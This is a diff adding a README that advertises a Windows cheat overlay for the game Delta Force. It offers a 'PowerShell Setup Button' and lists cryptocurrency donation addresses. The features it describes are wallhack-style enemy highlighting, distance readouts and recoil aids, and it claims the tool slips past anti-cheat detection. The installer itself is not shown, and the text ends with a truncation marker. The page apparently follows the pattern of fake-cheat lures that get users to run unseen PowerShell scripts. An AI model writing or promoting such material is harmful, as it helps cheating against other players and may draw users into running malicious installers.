@@ -1,0 +1,91 @@
+🎯 Delta Force Overlay Cebamir — Game Enhancer for Windows
+
+🔌 PowerShell Setup Button
+
+Keep the project growing
+
+TRON:&nbsp;TMUT4beiyPupwxoBVnzrLY3QSWSTGGeCBR | ETH:&nbsp;0x4A1117Bfdeb6238DC7b38cAeff4c40f198125A52
+
+Delta Force Overlay Cebamir delivers real-time gameplay assistance and clean information overlays built specifically for Delta Force, keeping critical intel visible without cluttering your screen. Get instant readouts and on-screen context that help you react faster and play smarter, all while staying focused on the fight. This is a focused enhancement layer, not a game overhaul—no unrelated changes, just the overlays and assistance you actually need. Drop it in, keep your eyes on the action, and let the intel do the work.
+
+📋 System Requirements
+
+- Windows 10 or Windows 11
+- PowerShell 5.1 or newer (already available on Windows)
+- Active network connection
+- No admin rights needed
+
+Features
+
+- Real-time target intel — highlights enemy positions, outlines, and distance readouts right on your screen so you always know what's around the corner before you peek.
+- Overlay HUD that stays out of the way — transparent, toggleable panels for ammo, health, and squad status that sit on top of the game without blocking your view or input.
+- Aim and recoil telemetry — live feedback on spread, recoil patterns, and hit markers so you can tighten your shots and correct mid-burst instead of guessing.
+- Loot and objective markers — flags high-value items, extraction points, and mission objectives with on-screen pins and directional cues.
+- Configurable info layers — turn individual overlays on or off, tweak opacity, scale, and placement to match your setup and playstyle.
+- Low-overhead design — built to run alongside Delta Force without dragging down framerate or adding input latency.
+- Hotkey-driven controls — quick toggles for every overlay element so you can pull up intel on demand and clear your screen when you need a clean view.
+
+How it works
+
+Delta Force Overlay Cebamir runs as a lightweight layer on top of your game session, reading what the game exposes and rendering it as clean, on-screen information. Nothing gets injected into the game's memory or files—the overlay stays in its own lane, so your framerate stays where it should be and the anti-game assistance sees business as usual.
+
+The core loop is simple: the overlay watches the state the game already provides, processes it in real time, and draws the results where you need them. Positions, distances, and status cues get translated into clear visual markers instead of raw noise. You get the intel, not a wall of data.
+
+Everything renders through a transparent, click-through window. Your mouse and keyboard inputs go straight to the game—the overlay never steals focus, never blocks your aim, and never fights you in a firefight. Toggle visibility with a hotkey whenever you want a clean screen.
+
+Assistance features are tuned for gameplay, not for playing the game for you. Information overlays show you what matters in the moment—threat indicators, range readouts, and status tracking—while staying subtle enough to keep your eyes on the action. The overlay is designed to inform your decisions, not replace them.
+
+Performance is treated as a first-class feature. The render path is optimized to keep frame impact minimal, and the update pipeline only does work when the game state actually changes. You shouldn't notice it's running until you need it.
+
+Configuration is handled through a single settings file, so you can dial in what's shown, where it sits, and how it responds without touching the code. Sensible defaults mean it works out of the box; the knobs are there when you want them.
+
+Modules and Settings
+
+Overlay Visibility Controls
+This module governs whether the delta-force-overlay-cebamir overlay appears at all and how strongly it sits over the game view, forming the base layer that every other panel relies on.
+- Global overlay toggle shows or hides the entire HUD instantly, so the player can return to a fully clean game view at any moment.
+- Opacity slider adjusts how transparent the overlay background is, keeping the underlying game visuals legible while information remains readable.
+- Per-panel switches enable or disable individual panels, and changes take effect immediately without reopening the settings view.
+- Background dimming option subtly darkens the area behind panels to improve contrast without blocking the game scene.
+
+Screen Element Filters
+This module decides which categories of on-screen information are emphasized, keeping the overlay focused when many elements compete for attention.
+- Category emphasis chooses which element groups, such as teammate markers, objective indicators, or directional cues, are prioritized in the overlay.
+- Density threshold tunes how readily elements appear so that crowded moments produce a cleaner result.
+- Marker style selection changes how indicators are drawn, letting the player pick a lighter or more detailed presentation.
+- Filter changes apply live, so the player can compare a sparse and a detailed overlay while remaining in the match.
+
+Layout and Positioning
+This module controls where panels sit and how large they are, working together with the visibility controls to keep important game areas unobstructed.
+- Drag-and-drop repositioning moves panels and indicators anywhere on screen, with optional edge anchoring for a fixed frame.
+- Panel resizing adjusts the footprint of each module, from compact strips to wider reference blocks.
+- Center or edge placement preference keeps frequently used elements near the player's natural viewing focus.
+- Layout settings persist between sessions, and saved arrangements carry across profiles.
+
+Threat and Directional Indicators
+This module surfaces directional and proximity cues for nearby activity, complementing the filters so that only relevant signals reach the player.
+- Sensitivity control sets how readily an indicator appears as activity approaches, reducing noise in quiet periods.
+- Display style choice switches between compact arrows and expanded panels depending on preferred detail.
+- Direction emphasis highlights orientation cues so the player can keep their bearings without scanning the full screen.
+- Indicator duration setting controls how long a cue remains visible after it triggers.
+
+Tactical Map Reference Panel
+This module provides a compact positional reference alongside the game, building on the layout module for placement and scale.
+- Zoom and scale controls adjust the map view between a broad overview and a closer local reference.
+- Label and grid toggles let the player match the map to their preferred reading style.
+- Detail level setting determines how much annotation the panel shows at once.
+- Map panel placement follows the shared layout settings, so it stays consistent with the rest of the HUD.
+
+Profile Presets
+This module bundles visibility, layout, filter, and indicator settings into named configurations, tying the other modules together into switchable setups.
+- Multiple profiles can be saved for different modes or roles, each retaining its own full configuration.
+- Quick profile switching reconfigures the overlay to the selected preset without manual re-adjustment.
+- Profile duplication lets the player start from an existing setup and adjust only the parts that need to differ.
+- Active profile indicator shows which preset is currently in effect so the player is never uncertain about the overlay state.
+
+Additional Settings
+- Hotkey and input bindings assign actions such as toggling panels, switching presets, or opening settings to chosen keys, with conflict-aware selection against existing controls.
+- Readout ordering options determine which status fields appear in the loadout and status summary and in what sequence.
+- Readout style choice switches between minimal and expanded presentation for at-a-glance reference.
+
+…（内容已截断）
